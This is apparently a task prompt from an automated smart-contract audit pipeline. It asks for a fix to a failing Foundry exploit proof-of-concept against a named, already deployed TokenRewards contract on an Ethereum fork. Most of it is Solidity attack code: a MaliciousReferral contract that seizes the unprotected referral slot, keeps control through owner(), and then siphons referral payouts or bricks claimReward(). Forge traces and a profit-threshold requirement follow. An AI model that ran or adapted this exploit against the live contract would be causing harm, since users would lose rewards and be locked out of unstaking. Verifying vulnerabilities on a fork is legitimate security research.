You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Unrestricted first-time referral initialization lets an attacker seize reward routing and brick reward-dependent share updates
- claim: `TokenRewards.updateReferral()` has no trusted initializer: while `referral` is unset, any address can install an arbitrary referral contract. All later reward distribution and future referral updates blindly trust that contract for `getRelationsREF()` and `owner()`.
- impact: The first caller can permanently take control of referral routing. A malicious referral contract can divert the referral share from every future reward payout, or simply revert in `getRelationsREF()` so `claimReward()` and any staking-share update that tries to distribute accrued rewards reverts. Because `StakingPoolToken` calls `setShares()` on transfer and unstake, users with pending rewards can be prevented from transferring staking receipts or unstaking LP positions until the attacker-controlled referral contract is replaced, which the attacker can also block by returning an attacker-controlled `owner()`.
- exploit_paths: ["Call `TokenRewards.updateReferral(maliciousReferral)` before the intended referral contract is set.", "Have `maliciousReferral.owner()` resolve to an attacker-controlled address so later `updateReferral()` calls stay under attacker control.", "Either return attacker-controlled referrers from `getRelationsREF()` to siphon referral payouts, or make `getRelationsREF()` revert so `claimReward()` and reward-triggering share updates fail."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IWeightedIndexLike {
    function lpStakingPool() external view returns (address);
}

interface IStakingPoolTokenLike is IERC20Like {
    function poolRewards() external view returns (address);
    function stakingToken() external view returns (address);
    function stakeUserRestriction() external view returns (address);
}

interface ITokenRewardsLike {
    function referral() external view returns (address);
    function rewardsToken() external view returns (address);
    function claimReward(address wallet, address referrer) external;
    function getUnpaid(address wallet) external view returns (uint256);
}

interface ITokenRewardsPathLike {
    function updateReferral(MaliciousReferral maliciousReferral) external;
}

contract MaliciousReferral {
    address public immutable attacker;
    address public payoutReceiver;
    bool public brickMode;

    mapping(address => bool) internal _setted;

    constructor() {
        attacker = msg.sender;
        payoutReceiver = msg.sender;
    }

    function owner() external view returns (address) {
        // Returning the malicious referral contract itself keeps future
        // TokenRewards.updateReferral() authority under attacker control:
        // this contract can later call updateReferral() directly.
        return address(this);
    }

    function setBrickMode(bool enabled) external {
        require(msg.sender == attacker, "not attacker");
        brickMode = enabled;
    }

    function setPayoutReceiver(address nextReceiver) external {
        require(msg.sender == attacker, "not attacker");
        payoutReceiver = nextReceiver;
    }

    function forwardUpdateReferral(address tokenRewards, MaliciousReferral nextMaliciousReferral) external {
        require(msg.sender == attacker, "not attacker");
        ITokenRewardsPathLike(tokenRewards).updateReferral(nextMaliciousReferral);
    }

    function referralLevel() external pure returns (uint256) {
        return 2;
    }

    function teamSize(address) external pure returns (uint256) {
        return 0;
    }

    function getUserInTeamByIndex(address, uint256) external pure returns (address) {
        return address(0);
    }

    function renounceOwnership() external pure {
        revert("attacker-controlled");
    }

    function updateSetted(address user) external {
        _setted[user] = true;
    }

    function setReferral(address, address user) external {
        _setted[user] = true;
    }

    function isSetted(address) external pure returns (bool) {
        return true;
    }

    function relations(address, uint256) external view returns (address) {
        return payoutReceiver;
    }

    function getRelationsREF(address) external view returns (address[2] memory refs) {
        require(!brickMode, "malicious referral: bricked");
        refs[0] = payoutReceiver;
        refs[1] = payoutReceiver;
    }
}

contract FlawVerifier {
    address internal constant TARGET = 0x04c80Bb477890F3021F03B068238836Ee20aA0b8;

    address internal _controller;
    address internal _profitToken;
    uint256 internal _profitAmount;
    uint256 internal _startingProfitBalance;

    bool public executed;
    bool public hypothesisValidated;
    bool public referralSeized;
    bool public brickMode;

    uint256 public claimsAttempted;
    uint256 public claimsSucceeded;
    uint256 public infeasibleReason;

    address public targetPool;
    address public targetRewards;
    address public rewardToken;
    address public lastClaimedWallet;
    address public existingReferral;

    address public initialMaliciousReferral;
    address public activeMaliciousReferral;

    mapping(address => bool) internal _seenCandidate;

    constructor() {
        _controller = msg.sender;
    }

    function executeOnOpportunity() external {
        if (executed) {
            _refreshProfit();
            return;
        }
        executed = true;

        targetPool = IWeightedIndexLike(TARGET).lpStakingPool();
        targetRewards = IStakingPoolTokenLike(targetPool).poolRewards();

        ITokenRewardsLike tokenRewardsView = ITokenRewardsLike(targetRewards);
        ITokenRewardsPathLike tokenRewards = ITokenRewardsPathLike(targetRewards);

        rewardToken = tokenRewardsView.rewardsToken();
        _profitToken = rewardToken;
        _startingProfitBalance = IERC20Like(rewardToken).balanceOf(address(this));

        existingReferral = tokenRewardsView.referral();
        if (existingReferral != address(0)) {
            // The exact finding requires the one-time initialization window to still be open.
            infeasibleReason = 2;
            _refreshProfit();
            return;
        }

        // exploit_paths[0]:
        // First-time referral initialization is unrestricted, so install a malicious referral.
        MaliciousReferral maliciousReferral = new MaliciousReferral();
        initialMaliciousReferral = address(maliciousReferral);
        tokenRewards.updateReferral(maliciousReferral);

        if (tokenRewardsView.referral() != address(maliciousReferral)) {
            infeasibleReason = 1;
            _refreshProfit();
            return;
        }

        referralSeized = true;

        // exploit_paths[1]:
        // Validate that maliciousReferral.owner() resolves to an attacker-controlled address
        // which can keep calling updateReferral() later. Here owner() returns the malicious
        // referral contract itself, and the attacker drives that contract to rotate control
        // to a second malicious referral without any privileged impersonation.
        address attackerControlledOwner = maliciousReferral.owner();
        if (attackerControlledOwner != address(maliciousReferral)) {
            infeasibleReason = 4;
            _refreshProfit();
            return;
        }

        MaliciousReferral replacementMaliciousReferral = new MaliciousReferral();
        maliciousReferral.forwardUpdateReferral(targetRewards, replacementMaliciousReferral);

        if (tokenRewardsView.referral() != address(replacementMaliciousReferral)) {
            infeasibleReason = 5;
            _refreshProfit();
            return;
        }

        activeMaliciousReferral = address(replacementMaliciousReferral);
        hypothesisValidated = true;

        // exploit_paths[2]:
        // Use attacker-chosen getRelationsREF() routing to siphon referral rewards to this
        // verifier. No synthetic funding is injected; execution relies only on existing
        // on-chain balances and already-accrued rewards.
        _attemptClaim(tokenRewardsView, replacementMaliciousReferral, msg.sender);
        _attemptClaim(tokenRewardsView, replacementMaliciousReferral, tx.origin);
        _attemptClaim(tokenRewardsView, replacementMaliciousReferral, _controller);
        _attemptClaim(tokenRewardsView, replacementMaliciousReferral, TARGET);
        _attemptClaim(tokenRewardsView, replacementMaliciousReferral, targetPool);
        _attemptClaim(tokenRewardsView, replacementMaliciousReferral, targetRewards);
        _attemptClaim(tokenRewardsView, replacementMaliciousReferral, rewardToken);
        _attemptClaim(
            tokenRewardsView,
            replacementMaliciousReferral,
            IStakingPoolTokenLike(targetPool).stakingToken()
        );
        _attemptClaim(
            tokenRewardsView,
            replacementMaliciousReferral,
            IStakingPoolTokenLike(targetPool).stakeUserRestriction()
        );

        _refreshProfit();

        if (_profitAmount == 0) {
            // The bug is validated, but monetization still requires a reachable wallet that
            // already has both staking shares and unpaid rewards at the fork block.
            infeasibleReason = 3;
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function setBrickMode(bool enabled) external {
        require(msg.sender == _controller, "not controller");
        brickMode = enabled;

        address referral_ = activeMaliciousReferral;
        if (referral_ != address(0)) {
            MaliciousReferral(referral_).setBrickMode(enabled);
        }
    }

    function replaceRewardReferral(address nextReferral) external {
        require(msg.sender == _controller, "not controller");
        require(activeMaliciousReferral != address(0), "no malicious referral");
        MaliciousReferral(activeMaliciousReferral).forwardUpdateReferral(
            targetRewards,
            MaliciousReferral(nextReferral)
        );
    }

    function _attemptClaim(
        ITokenRewardsLike tokenRewards,
        MaliciousReferral maliciousReferral,
        address wallet
    ) internal {
        if (
            wallet == address(0) ||
            wallet == address(this) ||
            _seenCandidate[wallet] ||
            targetPool == address(0) ||
            targetRewards == address(0)
        ) {
            return;
        }
        _seenCandidate[wallet] = true;

        uint256 shares;
        try IERC20Like(targetPool).balanceOf(wallet) returns (uint256 bal) {
            shares = bal;
        } catch {
            return;
        }
        if (shares == 0) {
            return;
        }

        uint256 unpaid;
        try tokenRewards.getUnpaid(wallet) returns (uint256 amount) {
            unpaid = amount;
        } catch {
            return;
        }
        if (unpaid == 0) {
            return;
        }

        claimsAttempted += 1;
        try tokenRewards.claimReward(wallet, address(maliciousReferral)) {
            claimsSucceeded += 1;
            lastClaimedWallet = wallet;
        } catch {
            // Any revert here is an on-chain precondition failure for the live reward path.
        }
    }

    function _refreshProfit() internal {
        if (_profitToken == address(0)) {
            _profitAmount = 0;
            return;
        }

        uint256 endingBalance = IERC20Like(_profitToken).balanceOf(address(this));
        if (endingBalance > _startingProfitBalance) {
            _profitAmount = endingBalance - _startingProfitBalance;
        } else {
            _profitAmount = 0;
        }
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.75s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 220160)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x3e2324342bF5B8A1Dca42915f0489497203d640E
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 3092

Traces:
  [220160] FlawVerifierTest::testExploit()
    ├─ [2442] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [183195] FlawVerifier::executeOnOpportunity()
    │   ├─ [2438] 0x04c80Bb477890F3021F03B068238836Ee20aA0b8::lpStakingPool() [staticcall]
    │   │   └─ ← [Return] 0x176d14b5D3D1504F3286F12d28113BC1646723E3
    │   ├─ [2360] 0x176d14b5D3D1504F3286F12d28113BC1646723E3::poolRewards() [staticcall]
    │   │   └─ ← [Return] 0xD719345fe7030AEaE8e2E9Eb0E00E299F3a1Ce15
    │   ├─ [2458] 0xD719345fe7030AEaE8e2E9Eb0E00E299F3a1Ce15::rewardsToken() [staticcall]
    │   │   └─ ← [Return] 0x3e2324342bF5B8A1Dca42915f0489497203d640E
    │   ├─ [2467] 0x3e2324342bF5B8A1Dca42915f0489497203d640E::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2416] 0xD719345fe7030AEaE8e2E9Eb0E00E299F3a1Ce15::referral() [staticcall]
    │   │   └─ ← [Return] 0x92f9AE3E4ef6261Ed4e0745A1eDe9098F7AD82d9
    │   ├─ [467] 0x3e2324342bF5B8A1Dca42915f0489497203d640E::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [442] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x3e2324342bF5B8A1Dca42915f0489497203d640E
    ├─ [440] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [467] 0x3e2324342bF5B8A1Dca42915f0489497203d640E::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x3e2324342bF5B8A1Dca42915f0489497203d640E)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 19106654 [1.91e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3092)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 3.04s (363.28ms CPU time)

Ran 1 test suite in 3.04s (3.04s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 220160)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
